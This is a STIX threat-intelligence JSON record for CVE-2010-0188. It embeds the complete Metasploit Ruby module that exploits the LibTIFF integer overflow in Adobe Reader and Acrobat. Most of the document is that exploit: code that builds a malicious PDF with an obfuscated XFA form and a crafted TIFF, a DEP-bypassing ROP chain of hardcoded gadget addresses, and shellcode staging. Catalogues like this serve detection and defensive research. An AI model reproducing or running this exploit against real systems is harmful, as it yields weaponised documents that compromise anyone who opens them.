{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e641b69e-bfa5-4447-bd90-5693c00524ec",
    "created": "2024-08-14T16:38:06.124147Z",
    "modified": "2024-08-14T16:38:06.124152Z",
    "name": "Adobe Acrobat Bundled LibTIFF Integer Overflow",
    "description": " This module exploits an integer overflow vulnerability in Adobe Reader and Adobe Acrobat Professional versions 8.0 through 8.2 and 9.0 through 9.3.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/adobe_libtiff.rb",
            "external_id": "adobe_libtiff.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0188"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/support/security/bulletins/apsb10-07.html"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20100223002318/http://secunia.com:80/blog/76"
        },
        {
            "source_name": "reference",
            "url": "http://bugix-security.blogspot.com/2010/03/adobe-pdf-libtiff-working-exploitcve.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Adobe Acrobat Bundled LibTIFF Integer Overflow',\n      'Description'    => %q{\n        This module exploits an integer overflow vulnerability in Adobe Reader and Adobe Acrobat\n        Professional versions 8.0 through 8.2 and 9.0 through 9.3.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Microsoft',                         # reported to Adobe\n          'villy <villys777[at]gmail.com>',  # public exploit\n          # Metasploit version by:\n          'jduck'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-0188' ],\n          [ 'BID', '38195' ],\n          [ 'OSVDB', '62526' ],\n          [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb10-07.html' ],\n          [ 'URL', 'http://web.archive.org/web/20100223002318/http://secunia.com:80/blog/76' ],\n          [ 'URL', 'http://bugix-security.blogspot.com/2010/03/adobe-pdf-libtiff-working-exploitcve.html' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n          'DisableNops'\t => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # test results (on Windows XP SP3)\n          # reader 6.0.1 - untested\n          # reader 7.0.5 - untested\n          # reader 7.0.8 - untested\n          # reader 7.0.9 - untested\n          # reader 7.1.0 - untested\n          # reader 7.1.1 - untested\n          # reader 8.0.0 - untested\n          # reader 8.1.1 - untested\n          # reader 8.1.2 - untested\n          # reader 8.1.3 - untested\n          # reader 8.1.4 - untested\n          # reader 8.1.5 - untested\n          # reader 8.1.6 - untested\n          # reader 8.2.0 - untested\n          # reader 9.0.0 - untested\n          # reader 9.1.0 - untested\n          # reader 9.2.0 - untested\n          # reader 9.3.0 - works\n          [ 'Adobe Reader 9.3.0 on Windows XP SP3 English (w/DEP bypass)',\n            {\n              # ew, hardcoded offsets - see make_tiff()\n            }\n          ],\n        ],\n      'DisclosureDate' => '2010-02-16',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),\n      ])\n\n  end\n\n  def exploit\n\n    tiff_data = make_tiff(payload.encoded)\n    xml_data = make_xml(tiff_data)\n    compressed = Zlib::Deflate.deflate(xml_data)\n\n    # Create the pdf\n    pdf = make_pdf(compressed)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n\n    file_create(pdf)\n\n  end\n\n\n  def random_non_ascii_string(count)\n    result = \"\"\n    count.times do\n      result << (rand(128) + 128).chr\n    end\n    result\n  end\n\n  def io_def(id)\n    \"%d 0 obj\\r\\n\" % id\n  end\n\n  def io_ref(id)\n    \"%d 0 R\" % id\n  end\n\n\n  #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/\n  def n_obfu(str)\n    result = \"\"\n    str.scan(/./u) do |c|\n      if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'\n        result << \"#%x\" % c.unpack(\"C*\")[0]\n      else\n        result << c\n      end\n    end\n    result\n  end\n\n\n  def ascii_hex_whitespace_encode(str)\n    result = \"\"\n    whitespace = \"\"\n    str.each_byte do |b|\n      result << whitespace << \"%02x\" % b\n      whitespace = \" \" * (rand(3) + 1)\n    end\n    result << \">\"\n  end\n\n\n  def make_pdf(xml_data)\n\n    xref = []\n    eol = \"\\x0d\\x0a\"\n    endobj = \"endobj\" << eol\n\n    pdf = \"%PDF-1.5\" << eol\n    pdf << \"%\" << random_non_ascii_string(4) << eol\n\n    xref << pdf.length\n    pdf << io_def(1) << n_obfu(\"<</Filter/FlateDecode/Length \") << xml_data.length.to_s << n_obfu(\"/Type /EmbeddedFile>>\") << eol\n    pdf << \"stream\" << eol\n    pdf << xml_data << eol\n    pdf << eol << \"endstream\" << eol\n    pdf << endobj\n\n    xref << pdf.length\n    pdf << io_def(2) << n_obfu(\"<</V () /Kids [\") << io_ref(3) << n_obfu(\"] /T (\") << \"topmostSubform[0]\" << n_obfu(\") >>\") << eol << endobj\n\n    xref << pdf.length\n    pdf << io_def(3) << n_obfu(\"<</Parent \") << io_ref(2) << n_obfu(\" /Kids [\") << io_ref(4) << n_obfu(\"] /T (\") << \"Page1[0]\" << n_obfu(\")>>\")\n    pdf << eol << endobj\n\n    xref << pdf.length\n    pdf << io_def(4) << n_obfu(\"<</MK <</IF <</A [0.0 1.0]>>/TP 1>>/P \") << io_ref(5)\n    pdf << n_obfu(\"/FT /Btn/TU (\") << \"ImageField1\" << n_obfu(\")/Ff 65536/Parent \") << io_ref(3)\n    pdf << n_obfu(\"/F 4/DA (/CourierStd 10 Tf 0 g)/Subtype /Widget/Type /Annot/T (\") << \"ImageField1[0]\" << n_obfu(\")/Rect [107.385 705.147 188.385 709.087]>>\")\n    pdf << eol << endobj\n\n    xref << pdf.length\n    pdf << io_def(5) << n_obfu(\"<</Rotate 0 /CropBox [0.0 0.0 612.0 792.0]/MediaBox [0.0 0.0 612.0 792.0]/Resources <</XObject >>/Parent \")\n    pdf << io_ref(6) << n_obfu(\"/Type /Page/PieceInfo null>>\")\n    pdf << eol << endobj\n\n    xref << pdf.length\n    pdf << io_def(6) << n_obfu(\"<</Kids [\") << io_ref(5) << n_obfu(\"]/Type /Pages/Count 1>>\")\n    pdf << eol << endobj\n\n    xref << pdf.length\n    pdf << io_def(7) << (\"<</PageMode /UseAttachments/Pages \") << io_ref(6)\n    pdf << (\"/MarkInfo <</Marked true>>/Lang (en-us)/AcroForm \") << io_ref(8)\n    pdf << (\"/Type /Catalog>>\")\n    pdf << eol << endobj\n\n    xref << pdf.length\n    pdf << io_def(8) << n_obfu(\"<</DA (/Helv 0 Tf 0 g )/XFA [(template) \") << io_ref(1) << n_obfu(\"]/Fields [\")\n    pdf << io_ref(2) << n_obfu(\"]>>\")\n    pdf << endobj << eol\n\n    xrefPosition = pdf.length\n    pdf << \"xref\" << eol\n    pdf << \"0 %d\" % (xref.length + 1) << eol\n    pdf << \"0000000000 65535 f\" << eol\n    xref.each do |index|\n      pdf << \"%010d 00000 n\" % index << eol\n    end\n    pdf << \"trailer\" << n_obfu(\"<</Size %d/Root \" % (xref.length + 1)) << io_ref(7) << \">>\" << eol\n    pdf << \"startxref\" << eol\n    pdf << xrefPosition.to_s() << eol\n    pdf << \"%%EOF\"\n\n  end\n\n  def make_tiff(code)\n    tiff_offset = 0x2038\n    shellcode_offset = 1500\n\n    tiff =  \"II*\\x00\"\n    tiff << [tiff_offset].pack('V')\n    tiff << make_nops(shellcode_offset)\n    tiff << code\n\n    # Padding\n    tiff << rand_text_alphanumeric(tiff_offset - 8 - code.length - shellcode_offset)\n\n    tiff << \"\\x07\\x00\\x00\\x01\\x03\\x00\\x01\\x00\"\n    tiff << \"\\x00\\x00\\x30\\x20\\x00\\x00\\x01\\x01\\x03\\x00\\x01\\x00\\x00\\x00\\x01\\x00\"\n    tiff << \"\\x00\\x00\\x03\\x01\\x03\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x06\\x01\"\n    tiff << \"\\x03\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x11\\x01\\x04\\x00\\x01\\x00\"\n    tiff << \"\\x00\\x00\\x08\\x00\\x00\\x00\\x17\\x01\\x04\\x00\\x01\\x00\\x00\\x00\\x30\\x20\"\n    tiff << \"\\x00\\x00\\x50\\x01\\x03\\x00\\xCC\\x00\\x00\\x00\\x92\\x20\\x00\\x00\\x00\\x00\"\n    tiff << \"\\x00\\x00\\x00\\x0C\\x0C\\x08\\x24\\x01\\x01\\x00\"\n\n    # The following executes a ret2lib using BIB.dll\n    # The effect is to bypass DEP and execute the shellcode in an indirect way\n    stack_data = [\n      0x70072f7,      # pop eax / ret\n      0x10104,\n      0x70015bb,      # pop ecx / ret\n      0x1000,\n      0x700154d,      # mov [eax], ecx / ret\n      0x70015bb,      # pop ecx / ret\n      0x7ffe0300,     # -- location of KiFastSystemCall\n      0x7007fb2,      # mov eax, [ecx] / ret\n      0x70015bb,      # pop ecx / ret\n      0x10011,\n      0x700a8ac,      # mov [ecx], eax / xor eax,eax / ret\n      0x70015bb,      # pop ecx / ret\n      0x10100,\n      0x700a8ac,      # mov [ecx], eax / xor eax,eax / ret\n      0x70072f7,      # pop eax / ret\n      0x10011,\n      0x70052e2,      # call [eax] / ret -- (KiFastSystemCall - VirtualAlloc?)\n      0x7005c54,      # pop esi / add esp,0x14 / ret\n      0xffffffff,\n      0x10100,\n      0x0,\n      0x10104,\n      0x1000,\n      0x40,\n      # The next bit effectively copies data from the interleaved stack to the memory\n      # pointed to by eax\n      # The data copied is:\n      # \\x5a\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\xf4\\x74\\x5a\\x05\\xb8\\x49\\x49\\x2a\n      # \\x00\\x8b\\xfa\\xaf\\x75\\xea\\x87\\xfe\\xeb\\x0a\\x5f\\xb9\\xe0\\x03\\x00\\x00\n      # \\xf3\\xa5\\xeb\\x09\\xe8\\xf1\\xff\\xff\\xff\\x90\\x90\\x90\\xff\\xff\\xff\\x90\n      0x700d731,      # mov eax, [ebp-0x24] / ret\n      0x70015bb,      # pop ecx / ret\n      0x26a525a,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0x3c2ecd58,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0xf4745a05,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0x2a4949b8,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0xaffa8b00,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0xfe87ea75,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0xb95f0aeb,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0x3e0,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0x9eba5f3,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0xfffff1e8,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0x909090ff,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700a722,      # add eax, 4 / ret\n      0x70015bb,      # pop ecx / ret\n      0x90ffffff,\n      0x700154d,      # mov [eax], ecx / ret\n      0x700d731,      # mov eax, [ebp-0x24] / ret\n      0x700112f       # call eax -- (execute stub to transition to full shellcode)\n    ].pack('V*')\n\n    tiff << stack_data\n\n    Rex::Text.encode_base64(tiff)\n  end\n\n  def make_xml(tiff_data)\n    xml_data = <<-EOS\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<xdp:xdp xmlns:xdp=\"http://ns.adobe.com/xdp/\">\n<config xmlns=\"http://www.xfa.org/schema/xci/1.0/\">\n<present>\n<pdf>\n<version>1.65</version>\n<interactive>1</interactive>\n<linearized>1</linearized>\n</pdf>\n<xdp>\n<packets>*</packets>\n</xdp>\n<destination>pdf</destination>\n</present>\n</config>\n<template baseProfile=\"interactiveForms\" xmlns=\"http://www.xfa.org/schema/xfa-template/2.4/\">\n<subform name=\"topmostSubform\" layout=\"tb\" locale=\"en_US\">\n<pageSet>\n<pageArea id=\"PageArea1\" name=\"PageArea1\">\n<contentArea name=\"ContentArea1\" x=\"0pt\" y=\"0pt\" w=\"612pt\" h=\"792pt\" />\n<medium short=\"612pt\" long=\"792pt\" stock=\"custom\" />\n</pageArea>\n</pageSet>\n<subform name=\"Page1\" x=\"0pt\" y=\"0pt\" w=\"612pt\" h=\"792pt\">\n<break before=\"pageArea\" beforeTarget=\"#PageArea1\" />\n<bind match=\"none\" />\n<field name=\"ImageField1\" w=\"28.575mm\" h=\"1.39mm\" x=\"37.883mm\" y=\"29.25mm\">\n<ui>\n<imageEdit />\n</ui>\n</field>\n<?templateDesigner expand 1?>\n</subform>\n<?templateDesigner expand 1?>\n</subform>\n<?templateDesigner FormTargetVersion 24?>\n<?templateDesigner Rulers horizontal:1, vertical:1, guidelines:1, crosshairs:0?>\n<?templateDesigner Zoom 94?>\n</template>\n<xfa:datasets xmlns:xfa=\"http://www.xfa.org/schema/xfa-data/1.0/\">\n<xfa:data>\n<topmostSubform>\n<ImageField1 xfa:contentType=\"image/tif\" href=\"\">REPLACE_TIFF</ImageField1>\n</topmostSubform>\n</xfa:data>\n</xfa:datasets>\n<PDFSecurity xmlns=\"http://ns.adobe.com/xtd/\" print=\"1\" printHighQuality=\"1\" change=\"1\" modifyAnnots=\"1\" formFieldFilling=\"1\" documentAssembly=\"1\" contentCopy=\"1\" accessibleContent=\"1\" metadata=\"1\" />\n<form checksum=\"a5Mpguasoj4WsTUtgpdudlf4qd4=\" xmlns=\"http://www.xfa.org/schema/xfa-form/2.8/\">\n<subform name=\"topmostSubform\">\n<instanceManager name=\"_Page1\" />\n<subform name=\"Page1\">\n<field name=\"ImageField1\" />\n</subform>\n<pageSet>\n<pageArea name=\"PageArea1\" />\n</pageSet>\n</subform>\n</form>\n</xdp:xdp>\nEOS\n    xml_data.gsub!(/REPLACE_TIFF/, tiff_data)\n\n    xml_data\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-02-16",
    "x_mitre_platforms": [
        "win'"
    ]
}